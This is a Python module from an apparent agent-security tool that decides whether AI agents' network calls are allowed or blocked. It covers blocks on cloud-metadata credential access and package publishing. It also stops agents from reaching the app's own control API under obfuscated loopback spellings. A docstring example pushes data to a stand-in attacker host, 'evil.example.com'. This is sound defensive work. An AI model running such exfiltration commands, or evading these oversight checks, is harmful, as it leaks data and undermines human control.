"""
Egress policy evaluation.

Takes the destinations `destinations.py` extracted from a tool call and decides
`allow` / `block` / `log_only` against a policy.

The shape of the policy model is load-bearing, so it is stated here rather than
left implicit in the code:

**Reads observe, writes deny.** A uniform destination allowlist is the version
of this feature that gets uninstalled on day one — agents legitimately reach
PyPI, npm, GitHub, docs and MCP endpoints constantly and that set cannot be
enumerated in advance. So reads are recorded and allowed; only the narrow,
unambiguous write classes are denied by default.

**Baseline needs no tuning by construction.** WAF rulesets, SELinux and
corporate egress firewalls are all technically correct and all widely disabled,
for one reason: the legitimate destination set drifts daily, the policy needs
perpetual maintenance, and the maintenance is nobody's job. The Baseline pack
covers only behaviour that is rare AND unambiguous, so it essentially never
fires falsely and there is nothing to maintain.

**Tuning burden is absorbed at deny-time.** Every block is promotable in one
click. That is the difference between firewall rules (proactive authoring,
abandoned within a quarter) and permission prompts (reactive approval,
sustained for years). See `promotion` fields on the verdict.

Presets, in increasing strictness:

    baseline   Baseline pack only. Reads observed, not blocked. Default.
    hardened   Baseline + writes must be on the allowlist + unknown-operation
               calls to first-seen hosts are denied. Needs tuning; opt-in.
    contained  Full allowlist; everything not listed is denied. A mode you
               enter FOR A RUN, not a global setting — a global allowlist
               covering a month of developer activity is intractable and will
               be abandoned, but the allowlist for "run the test suite" or
               "let this loop go overnight" is small and stable.
"""

import ipaddress
import logging
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import unquote

import yaml

from .destinations import UNKNOWN, WRITE, EgressAttempt, extract_from_tool_call

logger = logging.getLogger(__name__)

# Enforcement actions. Deliberately the same vocabulary the tool-permission
# engine uses, so egress rows and tool rows filter identically in the audit UI.
ALLOW = "allow"
BLOCK = "block"
LOG_ONLY = "log_only"

PRESET_BASELINE = "baseline"
PRESET_HARDENED = "hardened"
PRESET_CONTAINED = "contained"
VALID_PRESETS = (PRESET_BASELINE, PRESET_HARDENED, PRESET_CONTAINED)

_SEVERITY_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1, None: 0}
_ACTION_SEVERITY = {BLOCK: 2, LOG_ONLY: 1, ALLOW: 0}


@dataclass
class EgressPolicy:
    """A resolved egress policy, local or synced."""

    preset: str = PRESET_BASELINE
    # Hosts the operator has promoted. Matched by exact host or by domain
    # suffix (`github.com` covers `api.github.com`).
    allowlist: list = field(default_factory=list)
    # Hosts denied outright regardless of preset or operation.
    denylist: list = field(default_factory=list)
    # When True, an evaluation error blocks instead of allowing. Off by default
    # because Cursor and Copilot Guard plugins default fail-open and flipping
    # that globally is a per-runtime decision, not a policy default.
    fail_closed: bool = False
    # Waives rules marked `ci_exempt` (today: the IMDS rule). Set on runner
    # profiles where fetching instance credentials is legitimate.
    ci_profile: bool = False
    # Baseline can be disabled only explicitly, and doing so is worth auditing.
    baseline_enabled: bool = True
    policy_name: str = "local"
    policy_version: Optional[int] = None
    source: str = "local"  # "local" | "synced"


@dataclass
class EgressContext:
    """Per-call facts the policy needs that the tool input does not carry."""

    # Host of the repository's `origin` remote, when the call is a git push
    # from a known working directory. Enables the foreign-remote rule.
    origin_git_host: Optional[str] = None
    # Hosts already seen on this device. Used only by the hardened preset for
    # first-seen detection; an empty set means "everything is first-seen",
    # which is why hardened is opt-in and preceded by an observation period.
    known_hosts: frozenset = frozenset()
    # The local app's own port, so its loopback traffic is never self-matched.
    local_app_port: Optional[int] = None
    runtime_kind: Optional[str] = None
    session_id: Optional[str] = None
    # Hosts a human approved for THIS session and harness, {host: grant id}.
    # The caller loads it already scoped to (host, harness, session); the
    # engine only ever lets it clear a promotable block, never a denylist,
    # publish or metadata verdict.
    host_grants: dict = field(default_factory=dict)


@dataclass
class EgressVerdict:
    """The decision for one destination."""

    action: str
    attempt: EgressAttempt
    rule_id: Optional[str] = None
    rule_title: Optional[str] = None
    severity: Optional[str] = None
    reason: str = ""
    remediation: Optional[str] = None
    # True when the operator can resolve this block by promoting the host.
    # Publish interdiction and IMDS are deliberately NOT promotable in one
    # click — they warrant an explicit policy edit.
    promotable: bool = False


@dataclass
class EgressEvaluation:
    """Aggregate result for a whole tool call."""

    action: str = ALLOW
    verdicts: list = field(default_factory=list)
    network_capable: bool = False
    coverage: Optional[str] = None
    reason: str = ""

    @property
    def blocked(self) -> bool:
        return self.action == BLOCK


def load_baseline_pack(yaml_path: Optional[str] = None) -> list:
    """Load the bundled Baseline rule pack.

    Mirrors `core.tool_permissions.engine.load_essential_registry`: search the
    installed-package layout first, then the development layout, and degrade to
    an empty pack rather than raising. An empty pack means Baseline enforces
    nothing, which is why the caller logs loudly on a miss.
    """
    if yaml_path:
        paths = [Path(yaml_path)]
    else:
        paths = [
            Path(__file__).parent.parent.parent / "rules" / "egress" / "sv_egress_baseline.yml",
            Path(__file__).parent.parent.parent.parent / "rules" / "egress" / "sv_egress_baseline.yml",
        ]

    for p in paths:
        if p.exists():
            try:
                with open(p, "r", encoding="utf-8") as f:
                    data = yaml.safe_load(f) or {}
                rules = data.get("rules", []) or []
                logger.info("Loaded %d egress baseline rules from %s", len(rules), p)
                return rules
            except Exception as e:
                logger.warning("Failed to load egress baseline pack from %s: %s", p, e)

    logger.warning(
        "Egress baseline pack not found — baseline enforcement is INACTIVE. "
        "Publish interdiction and metadata-endpoint denial will not fire."
    )
    return []


def _host_matches(host: Optional[str], patterns) -> bool:
    """Exact host match, or suffix match on a domain boundary.

    `github.com` matches `api.github.com` but must NOT match `evilgithub.com`
    — hence the explicit dot check rather than a bare `endswith`.
    """
    if not host or not patterns:
        return False
    host = host.lower().rstrip(".")
    for pattern in patterns:
        p = str(pattern).lower().strip().rstrip(".")
        if not p:
            continue
        if host == p or host.endswith("." + p):
            return True
    return False


def _ip_in_cidrs(host: Optional[str], cidrs) -> bool:
    """True when `host` is a literal IP inside one of the CIDRs.

    Hostnames are deliberately not resolved. Doing DNS here would add a network
    call (and a timeout path) to every evaluation, and the resolved answer at
    policy time need not be the answer at connect time. A hostname that
    resolves into private space is caught at the network layer, which is where
    real containment lives anyway.
    """
    if not host or not cidrs:
        return False
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    for raw in cidrs:
        try:
            if ip in ipaddress.ip_network(str(raw), strict=False):
                return True
        except ValueError:
            logger.debug("Skipping malformed CIDR in egress pack: %r", raw)
    return False


def _rule_matches(rule: dict, attempt: EgressAttempt, ctx: EgressContext) -> bool:
    """Evaluate one baseline rule's match block against one attempt.

    Every predicate present must match (AND). An unknown predicate key causes
    the rule to NOT match, so a pack written for a newer app version fails
    closed against enforcement rather than silently matching everything.
    """
    match = rule.get("match") or {}
    known = {
        "is_publish", "hosts", "host_suffixes", "cidrs", "operation", "kinds",
        "foreign_git_remote", "inline_remote", "exclude_ports_from_settings",
    }
    unknown = set(match) - known
    if unknown:
        logger.warning(
            "Egress rule %s uses unsupported match keys %s — rule skipped. "
            "This app version cannot enforce it.",
            rule.get("id"), sorted(unknown),
        )
        return False

    if "is_publish" in match and bool(attempt.is_publish) != bool(match["is_publish"]):
        return False

    if "inline_remote" in match and bool(attempt.inline_remote) != bool(match["inline_remote"]):
        return False

    if "operation" in match and attempt.operation not in match["operation"]:
        return False

    if "kinds" in match and attempt.kind not in match["kinds"]:
        return False

    # Host predicates are OR'd with each other but AND'd with the rest: a rule
    # listing both `hosts` and `cidrs` matches a destination in either.
    host_predicates = [k for k in ("hosts", "host_suffixes", "cidrs") if k in match]
    if host_predicates:
        hit = False
        if "hosts" in match and attempt.host:
            hit = hit or attempt.host.lower() in {str(h).lower() for h in match["hosts"]}
        if "host_suffixes" in match:
            hit = hit or _host_matches(attempt.host, match["host_suffixes"])
        if "cidrs" in match:
            hit = hit or _ip_in_cidrs(attempt.host, match["cidrs"])
        if not hit:
            return False

    if match.get("foreign_git_remote"):
        # Without a known origin we cannot call a remote foreign. Declining to
        # match is correct: accusing every push of being foreign because we
        # could not read .git/config would be the false-positive that gets the
        # pack disabled.
        if not ctx.origin_git_host or not attempt.host:
            return False
        if attempt.host.lower() == ctx.origin_git_host.lower():
            return False

    if match.get("exclude_ports_from_settings"):
        if ctx.local_app_port and attempt.port == ctx.local_app_port:
            return False

    return True


def _baseline_verdict(attempt, policy, ctx, pack):
    """First matching baseline rule wins. Returns None when nothing matches."""
    if not policy.baseline_enabled:
        return None
    for rule in pack:
        if rule.get("ci_exempt") and policy.ci_profile:
            continue
        if not _rule_matches(rule, attempt, ctx):
            continue
        effect = (rule.get("effect") or BLOCK).lower()
        action = {"deny": BLOCK, "block": BLOCK, "log_only": LOG_ONLY, "allow": ALLOW}.get(effect, BLOCK)
        return EgressVerdict(
            action=action,
            attempt=attempt,
            rule_id=rule.get("id"),
            rule_title=rule.get("title"),
            severity=rule.get("severity"),
            reason=rule.get("title") or f"Baseline rule {rule.get('id')}",
            remediation=rule.get("remediation"),
            # Publish and metadata denials are severe enough that one-click
            # promotion is the wrong affordance — they should cost an explicit
            # policy edit. Everything else is promotable.
            promotable=rule.get("id") not in (
                "sv.egress.package_publish", "sv.egress.cloud_metadata",
            ),
        )
    return None


def evaluate_attempt(attempt, policy, ctx=None, pack=None) -> EgressVerdict:
    """Decide one destination, then apply any session host grant.

    A grant clears only a block the operator could have promoted, so a
    non-promotable rule (denylist, package publish, cloud metadata) stays
    blocked whatever the grant says.
    """
    ctx = ctx or EgressContext()
    verdict = _evaluate_attempt(attempt, policy, ctx, pack)
    host = (attempt.host or "").lower().rstrip(".")
    grant = ctx.host_grants.get(host) if (host and ctx.host_grants) else None
    if verdict.action == BLOCK and verdict.promotable and grant:
        return EgressVerdict(
            action=ALLOW, attempt=attempt, rule_id="grant.session_host",
            rule_title="Approved for this session",
            reason=(
                f"{host} was approved for this session by grant {grant} "
                f"(would otherwise be blocked by {verdict.rule_id})."
            ),
        )
    return verdict


def _evaluate_attempt(attempt, policy, ctx=None, pack=None) -> EgressVerdict:
    """Decide one destination."""
    ctx = ctx or EgressContext()
    pack = pack if pack is not None else load_baseline_pack()

    # Explicit denylist outranks everything, including the allowlist. An
    # operator who lists a host in both meant to deny it.
    if _host_matches(attempt.host, policy.denylist):
        return EgressVerdict(
            action=BLOCK, attempt=attempt, rule_id="policy.denylist",
            rule_title="Explicitly denied destination", severity="high",
            reason=f"{attempt.host} is on the policy denylist.",
            promotable=False,
        )

    baseline = _baseline_verdict(attempt, policy, ctx, pack)
    if baseline is not None and baseline.action != ALLOW:
        return baseline

    allowlisted = _host_matches(attempt.host, policy.allowlist)
    if allowlisted:
        return EgressVerdict(
            action=ALLOW, attempt=attempt, rule_id="policy.allowlist",
            reason=f"{attempt.host} is an allowed destination.",
        )

    preset = (policy.preset or PRESET_BASELINE).lower()

    if preset == PRESET_CONTAINED:
        return EgressVerdict(
            action=BLOCK, attempt=attempt, rule_id="preset.contained",
            rule_title="Not on the contained-run allowlist", severity="medium",
            reason=(
                f"Contained mode allows only listed destinations; "
                f"{attempt.host or 'an undetermined host'} is not listed."
            ),
            remediation="Add this destination to the run's allowlist if the run needs it.",
            promotable=True,
        )

    if preset == PRESET_HARDENED:
        # Writes need an explicit allow. UNKNOWN counts as write-shaped: we
        # could not establish that it is a read, and guessing "read" on an
        # opaque protocol is exactly the assumption that makes containment
        # theatre.
        if attempt.operation in (WRITE, UNKNOWN):
            first_seen = bool(attempt.host) and attempt.host.lower() not in ctx.known_hosts
            reason = (
                f"Hardened mode denies {attempt.operation} operations to "
                f"{attempt.host or 'an undetermined host'}"
            )
            if first_seen:
                reason += " (first seen on this device)"
            return EgressVerdict(
                action=BLOCK, attempt=attempt, rule_id="preset.hardened_write",
                rule_title="Unapproved write destination", severity="medium",
                reason=reason + ".",
                remediation="Promote this destination if the write is intended.",
                promotable=True,
            )

    # Baseline preset, or a read under any preset: recorded, not blocked.
    if baseline is not None:
        return baseline
    return EgressVerdict(
        action=ALLOW, attempt=attempt, rule_id=None,
        reason=f"{attempt.operation} to {attempt.host or 'undetermined host'} recorded.",
    )


# ------------------------------------------------- control API rule
#
# Policy, grant and tool-permission routes are for the user. The Guard hooks
# talk to the app as their own processes, never through a tool call, so a
# network-capable tool input naming these routes at the app's port is blocked.
#
# The match is host-agnostic on purpose. The app listens on loopback, and
# loopback has too many spellings to enumerate (127.1, localhost., 0x7f000001,
# [::ffff:7f00:1], a shell variable), so the rule keys on the one thing every
# spelling shares: the app's port followed by /api/<control route>. The input
# is percent-decoded once first (%61pi), matched case-insensitively, and
# tolerates repeated slashes. Only text that can reach the network is
# scanned (a Bash command, a WebFetch URL, an MCP endpoint), never a file
# being written or searched, so docs and tests that mention the URL pass.
#
# The same-origin header check on /jit/ui-token and the UI-token checks on
# the policy and grant routes apply as well.

SELF_CONTROL_RULE_ID = "sv.self.control_api"
DEFAULT_APP_PORT = 8741
SELF_CONTROL_PREFIXES = (
    "jit", "egress", "tool-permissions", "skill-permissions", "settings", "terminals",
)
_SELF_CONTROL_RE = re.compile(
    r"(?P<host>[^\s'\"<>\\/]{0,253}?)"
    r":(?P<port>\d{1,5})"
    r"/+api/+(?P<route>" + "|".join(re.escape(p) for p in SELF_CONTROL_PREFIXES) + r")(?=[/?#\s'\"\\]|$)",
    re.IGNORECASE,
)


def _network_texts(tool_name: str, tool_input, mcp_endpoint: Optional[str] = None) -> list:
    """The parts of a tool input that can reach the network: the fields
    `extract_from_tool_call` reads, and nothing else."""
    tool_input = tool_input if isinstance(tool_input, dict) else {}
    lowered = (tool_name or "").strip().lower()
    if lowered.startswith("mcp__"):
        return [mcp_endpoint] if mcp_endpoint else []
    if lowered == "webfetch":
        return [tool_input.get("url") or tool_input.get("URL") or ""]
    if lowered == "websearch":
        return []
    return [tool_input.get("command") or tool_input.get("script") or ""]


def self_control_verdict(texts, app_port: Optional[int] = None) -> Optional[EgressVerdict]:
    """A block verdict when a network-capable text targets the app's control
    API at the app's own port; None otherwise. `texts` is the list
    `_network_texts` built (a single string is accepted too)."""
    port = int(app_port or DEFAULT_APP_PORT)
    if isinstance(texts, str):
        texts = [texts]
    for text in texts or []:
        if not isinstance(text, str) or not text:
            continue
        for m in _SELF_CONTROL_RE.finditer(unquote(text)):
            if int(m.group("port")) != port:
                continue
            host = (m.group("host") or "").strip("[]").lower() or "127.0.0.1"
            attempt = EgressAttempt(
                host=host, operation=UNKNOWN, kind="http", detector="self_control",
                confidence="PARSED", port=port, evidence=m.group(0)[:160],
            )
            return EgressVerdict(
                action=BLOCK, attempt=attempt, rule_id=SELF_CONTROL_RULE_ID,
                rule_title="Agent call to the SecureVector control API",
                severity="critical",
                reason=(
                    f"Agents may not call the SecureVector control API "
                    f"(/api/{m.group('route').lower()}); approvals and policy "
                    f"changes are made by a person in the app."
                ),
                promotable=False,
            )
    return None


def evaluate_tool_call(
    tool_name: str,
    tool_input: Optional[dict] = None,
    policy: Optional[EgressPolicy] = None,
    ctx: Optional[EgressContext] = None,
    mcp_endpoint: Optional[str] = None,
    pack: Optional[list] = None,
) -> EgressEvaluation:
    """Extract every destination in a tool call and decide the call as a whole.

    The call's action is the strictest verdict any single destination produced:
    `curl docs.example.com && git push evil.example.com` is one Bash call and
    must be blocked, not averaged.
    """
    policy = policy or EgressPolicy()
    ctx = ctx or EgressContext()

    extraction = extract_from_tool_call(tool_name, tool_input, mcp_endpoint=mcp_endpoint)
    if not extraction.network_capable:
        return EgressEvaluation(action=ALLOW, network_capable=False)

    # The app's own control API is never a destination an agent may reach,
    # whatever the preset: checked on the network-capable text only, never
    # promotable.
    self_call = self_control_verdict(
        _network_texts(tool_name, tool_input, mcp_endpoint), ctx.local_app_port)
    if self_call is not None:
        return EgressEvaluation(
            action=BLOCK, verdicts=[self_call], network_capable=True,
            coverage="Agent call to the SecureVector control API.",
            reason=self_call.reason,
        )

    if pack is None:
        pack = load_baseline_pack()

    verdicts = [evaluate_attempt(a, policy, ctx, pack) for a in extraction.attempts]

    # Strictest action wins; ties broken by rule severity.
    action, reason = ALLOW, ""
    if verdicts:
        strictest = max(
            verdicts,
            key=lambda v: (_ACTION_SEVERITY.get(v.action, 0), _SEVERITY_ORDER.get(v.severity, 0)),
        )
        action, reason = strictest.action, strictest.reason

    return EgressEvaluation(
        action=action,
        verdicts=verdicts,
        network_capable=True,
        coverage=extraction.coverage,
        reason=reason,
    )
